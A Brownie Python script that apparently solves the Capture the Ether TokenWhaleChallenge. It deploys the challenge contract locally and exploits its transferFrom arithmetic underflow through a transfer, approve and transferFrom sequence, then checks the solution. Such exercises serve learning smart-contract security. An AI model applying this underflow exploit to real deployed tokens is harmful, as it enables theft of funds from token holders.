import math
from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    TokenWhaleChallenge
)
from scripts.helpful_scripts import (
    get_account,
    get_contract_address,
    check_solution,
)
from web3 import Web3


def main():
    player = get_account()
    non_player = get_account(index=1)
    challenge_contract = TokenWhaleChallenge.deploy(player, {"from": player})

    tx = challenge_contract.transfer(non_player, 501, {"from": player})
    tx.wait(1)
    tx = challenge_contract.approve(player, 1000, {"from": non_player})
    tx.wait(1)
    tx = challenge_contract.transferFrom(non_player, non_player, 500, {"from": player})
    tx.wait(1)

    check_solution(challenge_contract.address)